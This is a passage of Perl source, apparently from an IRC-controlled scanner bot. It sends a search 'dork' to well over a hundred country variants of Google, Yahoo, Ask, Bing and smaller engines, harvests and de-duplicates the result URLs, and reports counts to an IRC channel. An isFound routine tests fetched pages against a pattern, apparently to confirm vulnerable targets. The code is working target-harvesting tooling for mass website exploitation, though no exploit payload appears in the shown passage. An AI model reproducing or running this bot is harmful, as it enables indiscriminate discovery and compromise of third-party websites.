    my $logo = $_[4];
    if ($engine eq "JacKAE") { my @jackae = &jack($dork."+site:ae",$jackae); push(@total,@jackae); }
    if ($engine eq "JacKAR") { my @jackar = &jack($dork."+site:ar",$jackar); push(@total,@jackar); }
    if ($engine eq "JacKAT") { my @jackat = &jack($dork."+site:at",$jackat); push(@total,@jackat); }
    if ($engine eq "JacKAU") { my @jackau = &jack($dork."+site:au",$jackau); push(@total,@jackau); }
    if ($engine eq "JacKBR") { my @jackbr = &jack($dork."+site:br",$jackbr); push(@total,@jackbr); }
    if ($engine eq "JacKCA") { my @jackca = &jack($dork."+site:ca",$jackca); push(@total,@jackca); }
    if ($engine eq "JacKCL") { my @jackcl = &jack($dork."+site:cl",$jackcl); push(@total,@jackcl); }
    if ($engine eq "JacKCN") { my @jackcn = &jack($dork."+site:cn",$jackcn); push(@total,@jackcn); }
    if ($engine eq "JacKCoM") { my @jackcom = &jack($dork."+site:com",$jackcom); push(@total,@jackcom); }
    if ($engine eq "JacKCZ") { my @jackcz = &jack($dork."+site:cz",$jackcz); push(@total,@jackcz); }
    if ($engine eq "JacKDE") { my @jackde = &jack($dork."+site:de",$jackde); push(@total,@jackde); }
    if ($engine eq "JacKDK") { my @jackdk = &jack($dork."+site:dk",$jackdk); push(@total,@jackdk); }
    if ($engine eq "JacKES") { my @jackes = &jack($dork."+site:es",$jackes); push(@total,@jackes); }
    if ($engine eq "JacKEU") { my @jackeu = &jack($dork."+site:eu",$jackeu); push(@total,@jackeu); }
    if ($engine eq "JacKFR") { my @jackfr = &jack($dork."+site:fr",$jackfr); push(@total,@jackfr); }
    if ($engine eq "JacKHU") { my @jackhu = &jack($dork."+site:hu",$jackhu); push(@total,@jackhu); }
    if ($engine eq "JacKID") { my @jackid = &jack($dork."+site:id",$jackid); push(@total,@jackid); }
    if ($engine eq "JacKIL") { my @jackil = &jack($dork."+site:il",$jackil); push(@total,@jackil); }
    if ($engine eq "JacKIN") { my @jackin = &jack($dork."+site:in",$jackin); push(@total,@jackin); }
    if ($engine eq "JacKInfO") { my @jackinfo = &jack($dork."+site:info",$jackinfo); push(@total,@jackinfo); }
    if ($engine eq "JacKIR") { my @jackir = &jack($dork."+site:ir",$jackir); push(@total,@jackir); }
    if ($engine eq "JacKIT") { my @jackit = &jack($dork."+site:it",$jackit); push(@total,@jackit); }
    if ($engine eq "JacKJP") { my @jackjp = &jack($dork."+site:jp",$jackjp); push(@total,@jackjp); }
    if ($engine eq "JacKKR") { my @jackkr = &jack($dork."+site:kr",$jackkr); push(@total,@jackkr); }
    if ($engine eq "JacKMX") { my @jackmx = &jack($dork."+site:mx",$jackmx); push(@total,@jackmx); }
    if ($engine eq "JacKMY") { my @jackmy = &jack($dork."+site:my",$jackmy); push(@total,@jackmy); }
    if ($engine eq "JacKNeT") { my @jacknet = &jack($dork."+site:net",$jacknet); push(@total,@jacknet); }
    if ($engine eq "JacKNL") { my @jacknl = &jack($dork."+site:nl",$jacknl); push(@total,@jacknl); }
    if ($engine eq "JacKOrG") { my @jackorg = &jack($dork."+site:org",$jackorg); push(@total,@jackorg); }
    if ($engine eq "JacKPH") { my @jackph = &jack($dork."+site:ph",$jackph); push(@total,@jackph); }
    if ($engine eq "JacKPL") { my @jackpl = &jack($dork."+site:pl",$jackpl); push(@total,@jackpl); }
    if ($engine eq "JacKRO") { my @jackro = &jack($dork."+site:ro",$jackro); push(@total,@jackro); }
    if ($engine eq "JacKRU") { my @jackru = &jack($dork."+site:ru",$jackru); push(@total,@jackru); }
    if ($engine eq "JacKTH") { my @jackth = &jack($dork."+site:th",$jackth); push(@total,@jackth); }
    if ($engine eq "JacKUA") { my @jackua = &jack($dork."+site:ua",$jackua); push(@total,@jackua); }
    if ($engine eq "JacKUK") { my @jackuk = &jack($dork."+site:uk",$jackuk); push(@total,@jackuk); }
    if ($engine eq "JacKUS") { my @jackus = &jack($dork."+site:us",$jackus); push(@total,@jackus); }
    if ($engine eq "JacKSI") { my @jacksi = &jack($dork."+site:si",$jacksi); push(@total,@jacksi); }
    if ($engine eq "JacKBE") { my @jackbe = &jack($dork."+site:be",$jackbe); push(@total,@jackbe); }
    if ($engine eq "JacKBIZ") { my @jackbiz = &jack($dork."+site:biz",$jackbiz); push(@total,@jackbiz); }
    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }
    if ($engine eq "GooGLeCA") { my @googleCA = googleCA($dork); push(@total,@googleCA); }
    if ($engine eq "GooGLeDE") { my @googleDE = googleDE($dork); push(@total,@googleDE); }
    if ($engine eq "GooGLeUK") { my @googleUK = googleUK($dork); push(@total,@googleUK); }
    if ($engine eq "GooGLeFR") { my @googleFR = googleFR($dork); push(@total,@googleFR); }
    if ($engine eq "GooGLeES") { my @googleES = googleES($dork); push(@total,@googleES); }
    if ($engine eq "GooGLeIT") { my @googleIT = googleIT($dork); push(@total,@googleIT); }
    if ($engine eq "GooGLeNL") { my @googleNL = googleNL($dork); push(@total,@googleNL); }
    if ($engine eq "GooGLeBE") { my @googleBE = googleBE($dork); push(@total,@googleBE); }
    if ($engine eq "GooGLeCH") { my @googleCH = googleCH($dork); push(@total,@googleCH); }
    if ($engine eq "GooGLeSE") { my @googleSE = googleSE($dork); push(@total,@googleSE); }
    if ($engine eq "GooGLeDK") { my @googleDK = googleDK($dork); push(@total,@googleDK); }
    if ($engine eq "GooGLeNO") { my @googleNO = googleNO($dork); push(@total,@googleNO); }
    if ($engine eq "GooGLeNZ") { my @googleNZ = googleNZ($dork); push(@total,@googleNZ); }
    if ($engine eq "GooGLeIE") { my @googleIE = googleIE($dork); push(@total,@googleIE); }
    if ($engine eq "GooGLeBR") { my @googleBR = googleBR($dork); push(@total,@googleBR); }
    if ($engine eq "GooGLeAR") { my @googleAR = googleAR($dork); push(@total,@googleAR); }
    if ($engine eq "GooGLeCO") { my @googleCO = googleCO($dork); push(@total,@googleCO); }
    if ($engine eq "GooGLeCU") { my @googleCU = googleCU($dork); push(@total,@googleCU); }
    if ($engine eq "GooGLeCL") { my @googleCL = googleCL($dork); push(@total,@googleCL); }
    if ($engine eq "GooGLeMX") { my @googleMX = googleMX($dork); push(@total,@googleMX); }
    if ($engine eq "GooGLeAU") { my @googleAU = googleAU($dork); push(@total,@googleAU); }
    if ($engine eq "GooGLeRU") { my @googleRU = googleRU($dork); push(@total,@googleRU); }
    if ($engine eq "GooGLeAT") { my @googleAT = googleAT($dork); push(@total,@googleAT); }
    if ($engine eq "GooGLePL") { my @googlePL = googlePL($dork); push(@total,@googlePL); }
    if ($engine eq "GooGLeIL") { my @googleIL = googleIL($dork); push(@total,@googleIL); }
    if ($engine eq "GooGLeTR") { my @googleTR = googleTR($dork); push(@total,@googleTR); }
    if ($engine eq "GooGLeUA") { my @googleUA = googleUA($dork); push(@total,@googleUA); }
    if ($engine eq "GooGLeGR") { my @googleGR = googleGR($dork); push(@total,@googleGR); }
    if ($engine eq "GooGLeJP") { my @googleJP = googleJP($dork); push(@total,@googleJP); }
    if ($engine eq "GooGLeCN") { my @googleCN = googleCN($dork); push(@total,@googleCN); }
    if ($engine eq "GooGLeMY") { my @googleMY = googleMY($dork); push(@total,@googleMY); }
    if ($engine eq "GooGLeTH") { my @googleTH = googleTH($dork); push(@total,@googleTH); }
    if ($engine eq "GooGLeIN") { my @googleIN = googleIN($dork); push(@total,@googleIN); }
    if ($engine eq "GooGLeKR") { my @googleKR = googleKR($dork); push(@total,@googleKR); }
    if ($engine eq "GooGLeRO") { my @googleRO = googleRO($dork); push(@total,@googleRO); }
    if ($engine eq "GooGLeTW") { my @googleTW = googleTW($dork); push(@total,@googleTW); }
    if ($engine eq "GooGLeZA") { my @googleZA = googleZA($dork); push(@total,@googleZA); }
    if ($engine eq "GooGLePT") { my @googlePT = googlePT($dork); push(@total,@googlePT); }
    if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }
    if ($engine eq "YaHoo") { my @yahoo = &yahoo($dork); push(@total,@yahoo); }
    if ($engine eq "YahOoCA") { my @yahooCA = yahooCA($dork); push(@total,@yahooCA); }
    if ($engine eq "YahOoUK") { my @yahooUK = yahooUK($dork); push(@total,@yahooUK); }
    if ($engine eq "YahOoDE") { my @yahooDE = yahooDE($dork); push(@total,@yahooDE); }
    if ($engine eq "YahOoFR") { my @yahooFR = yahooFR($dork); push(@total,@yahooFR); }
    if ($engine eq "YahOoES") { my @yahooES = yahooES($dork); push(@total,@yahooES); }
    if ($engine eq "YahOoIT") { my @yahooIT = yahooIT($dork); push(@total,@yahooIT); }
    if ($engine eq "YahOoHK") { my @yahooHK = yahooHK($dork); push(@total,@yahooHK); }
    if ($engine eq "YahOoID") { my @yahooID = yahooID($dork); push(@total,@yahooID); }
    if ($engine eq "YahOoIN") { my @yahooIN = yahooIN($dork); push(@total,@yahooIN); }
    if ($engine eq "YahOoAU") { my @yahooAU = yahooAU($dork); push(@total,@yahooAU); }
    if ($engine eq "YahOoMX") { my @yahooMX = yahooMX($dork); push(@total,@yahooMX); }
    if ($engine eq "YahOoTW") { my @yahooTW = yahooTW($dork); push(@total,@yahooTW); }
    if ($engine eq "YahOoBR") { my @yahooBR = yahooBR($dork); push(@total,@yahooBR); }
    if ($engine eq "YahOoAR") { my @yahooAR = yahooAR($dork); push(@total,@yahooAR); }
    if ($engine eq "YahOoNL") { my @yahooNL = yahooNL($dork); push(@total,@yahooNL); }
    if ($engine eq "YahOoDK") { my @yahooDK = yahooDK($dork); push(@total,@yahooDK); }
    if ($engine eq "YahOoPH") { my @yahooPH = yahooPH($dork); push(@total,@yahooPH); }
    if ($engine eq "YahOoCL") { my @yahooCL = yahooCL($dork); push(@total,@yahooCL); }
    if ($engine eq "YahOoRU") { my @yahooRU = yahooRU($dork); push(@total,@yahooRU); }
    if ($engine eq "YahOoCH") { my @yahooCH = yahooCH($dork); push(@total,@yahooCH); }
    if ($engine eq "YahOoCO") { my @yahooCO = yahooCO($dork); push(@total,@yahooCO); }
    if ($engine eq "YahOoFI") { my @yahooFI = yahooFI($dork); push(@total,@yahooFI); }
    if ($engine eq "YahOoRO") { my @yahooRO = yahooRO($dork); push(@total,@yahooRO); }
    if ($engine eq "YahOoVE") { my @yahooVE = yahooVE($dork); push(@total,@yahooVE); }
    if ($engine eq "YahOoAT") { my @yahooAT = yahooAT($dork); push(@total,@yahooAT); }
    if ($engine eq "YahOoPL") { my @yahooPL = yahooPL($dork); push(@total,@yahooPL); }
    if ($engine eq "YahOoKR") { my @yahooKR = yahooKR($dork); push(@total,@yahooKR); }
    if ($engine eq "YahOoNZ") { my @yahooNZ = yahooNZ($dork); push(@total,@yahooNZ); }
    if ($engine eq "YahOoGR") { my @yahooGR = yahooGR($dork); push(@total,@yahooGR); }
    if ($engine eq "YahOoPE") { my @yahooPE = yahooPE($dork); push(@total,@yahooPE); }
    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }
    if ($engine eq "AsKCA") { my @askCA = askCA($dork); push(@total,@askCA); }
    if ($engine eq "AsKDE") { my @askDE = askDE($dork); push(@total,@askDE); }
    if ($engine eq "AsKIT") { my @askIT = askIT($dork); push(@total,@askIT); }
    if ($engine eq "AsKUK") { my @askUK = askUK($dork); push(@total,@askUK); }
    if ($engine eq "AsKFR") { my @askFR = askFR($dork); push(@total,@askFR); }
    if ($engine eq "AsKES") { my @askES = askES($dork); push(@total,@askES); }
    if ($engine eq "AsKRU") { my @askRU = askRU($dork); push(@total,@askRU); }
    if ($engine eq "AsKNL") { my @askNL = askNL($dork); push(@total,@askNL); }
    if ($engine eq "AsKEU") { my @askEU = askEU($dork); push(@total,@askEU); }
    if ($engine eq "AsKPL") { my @askPL = askPL($dork); push(@total,@askPL); }
    if ($engine eq "AsKAT") { my @askAT = askAT($dork); push(@total,@askAT); }
    if ($engine eq "AsKSE") { my @askSE = askSE($dork); push(@total,@askSE); }
    if ($engine eq "AsKDK") { my @askDK = askDK($dork); push(@total,@askDK); }
    if ($engine eq "AsKNO") { my @askNO = askNO($dork); push(@total,@askNO); }
    if ($engine eq "AsKAU") { my @askAU = askAU($dork); push(@total,@askAU); }
    if ($engine eq "AsKBR") { my @askBR = askBR($dork); push(@total,@askBR); }
    if ($engine eq "AsKMX") { my @askMX = askMX($dork); push(@total,@askMX); }
    if ($engine eq "AsKJP") { my @askJP = askJP($dork); push(@total,@askJP); }
    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }
    if ($engine eq "BingDE") { my @bingDE = bingDE($dork); push(@total,@bingDE); }
    if ($engine eq "BingUK") { my @bingUK = bingUK($dork); push(@total,@bingUK); }
    if ($engine eq "BingCA") { my @bingCA = bingCA($dork); push(@total,@bingCA); }
    if ($engine eq "BingBR") { my @bingBR = bingBR($dork); push(@total,@bingBR); }
    if ($engine eq "BingFR") { my @bingFR = bingFR($dork); push(@total,@bingFR); }
    if ($engine eq "BingES") { my @bingES = bingES($dork); push(@total,@bingES); }
    if ($engine eq "BingIT") { my @bingIT = bingIT($dork); push(@total,@bingIT); }
    if ($engine eq "BingBE") { my @bingBE = bingBE($dork); push(@total,@bingBE); }
    if ($engine eq "BingNL") { my @bingNL = bingNL($dork); push(@total,@bingNL); }
    if ($engine eq "BingPT") { my @bingPT = bingPT($dork); push(@total,@bingPT); }
    if ($engine eq "BingNO") { my @bingNO = bingNO($dork); push(@total,@bingNO); }
    if ($engine eq "BingDK") { my @bingDK = bingDK($dork); push(@total,@bingDK); }
    if ($engine eq "BingSE") { my @bingSE = bingSE($dork); push(@total,@bingSE); }
    if ($engine eq "BingCH") { my @bingCH = bingCH($dork); push(@total,@bingCH); }
    if ($engine eq "BingNZ") { my @bingNZ = bingNZ($dork); push(@total,@bingNZ); }
    if ($engine eq "BingRU") { my @bingRU = bingRU($dork); push(@total,@bingRU); }
    if ($engine eq "BingJP") { my @bingJP = bingJP($dork); push(@total,@bingJP); }
    if ($engine eq "BingCN") { my @bingCN = bingCN($dork); push(@total,@bingCN); }
    if ($engine eq "BingKR") { my @bingKR = bingKR($dork); push(@total,@bingKR); }
    if ($engine eq "BingMX") { my @bingMX = bingMX($dork); push(@total,@bingMX); }
    if ($engine eq "BingAR") { my @bingAR = bingAR($dork); push(@total,@bingAR); }
    if ($engine eq "BingCL") { my @bingCL = bingCL($dork); push(@total,@bingCL); }
    if ($engine eq "BingAU") { my @bingAU = bingAU($dork); push(@total,@bingAU); }
    if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }
    if ($engine eq "OnEt") { my @onet = &onet($dork); push(@total,@onet); }
    if ($engine eq "CLusTy") { my @clusty = &clusty($dork); push(@total,@clusty); }
    if ($engine eq "SaPo") { my @sapo = &sapo($dork); push(@total,@sapo); }
    if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }
    if ($engine eq "LyCos") { my @lycos = &lycos($dork); push(@total,@lycos); }
    if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
    if ($engine eq "SeZNam") { my @seznam = &seznam($dork); push(@total,@seznam); }
    if ($engine eq "BigLobe") { my @biglobe = &biglobe($dork); push(@total,@biglobe); }
    @clean = &clean(@total);
    if ($silentmode == 0) {
    &msg("$chan","$logo(7@2$engine15)12 Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).")"); }
    return @clean;
}
##################################################################################
sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = &get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout($timot);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}
######################################### SEARCH ENGINE

sub jack() {
    my @list;
    my $key = $_[0];
	my $jackx = $_[1];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackx.uri_escape($key)."&num=100&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub google() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com/search?q=".uri_escape($key)."&num=100&filter=0&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ca/search?q=".uri_escape($key)."&hl=&cr=countryCA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleDE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.de/search?q=".uri_escape($key)."&hl=&cr=countryDE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleDE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleUK() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.uk/search?q=".uri_escape($key)."&hl=&cr=countryUK&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleUK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleFR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.fr/search?q=".uri_escape($key)."&hl=&cr=countryFR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleFR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleES() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.es/search?q=".uri_escape($key)."&hl=&cr=countryES&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleES/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.it/search?q=".uri_escape($key)."&hl=&cr=countryIT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(1);
sub googleNL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.nl/search?q=".uri_escape($key)."&hl=&cr=countryNL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleBE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.be/search?q=".uri_escape($key)."&hl=&cr=countryBE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleBE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCH() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ch/search?q=".uri_escape($key)."&hl=&cr=countryCH&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(1);
sub googleSE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.se/search?q=".uri_escape($key)."&hl=&cr=countrySE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleSE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleDK() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.dk/search?q=".uri_escape($key)."&hl=&cr=countryDK&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleDK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleNO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.no/search?q=".uri_escape($key)."&hl=&cr=countryNO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(1);
sub googleNZ() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.nz/search?q=".uri_escape($key)."&hl=&cr=countryNZ&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNZ/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ie/search?q=".uri_escape($key)."&hl=&cr=countryIE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleBR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.br/search?q=".uri_escape($key)."&hl=&cr=countryBR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(2);
sub googleAR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ar/search?q=".uri_escape($key)."&hl=&cr=countryAR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.co/search?q=".uri_escape($key)."&hl=&cr=countryCO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.cu/search?q=".uri_escape($key)."&hl=&cr=countryCU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(2);
sub googleCL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.cl/search?q=".uri_escape($key)."&hl=&cr=countryCL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleMX() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.mx/search?q=".uri_escape($key)."&hl=&cr=countryMX&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleMX/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleAU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.au/search?q=".uri_escape($key)."&hl=&cr=countryAU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(2);
sub googleRU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ru/search?q=".uri_escape($key)."&hl=&cr=countryRU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleRU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleAT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.at/search?q=".uri_escape($key)."&hl=&cr=countryAT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googlePL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.pl/search?q=".uri_escape($key)."&hl=&cr=countryPL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googlePL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleIL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.il/search?q=".uri_escape($key)."&hl=&cr=countryIL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.tr/search?q=".uri_escape($key)."&hl=&cr=countryTR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleUA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ua/search?q=".uri_escape($key)."&hl=&cr=countryUA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleUA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleGR() {
    my @list;
    my $key = $_[0];
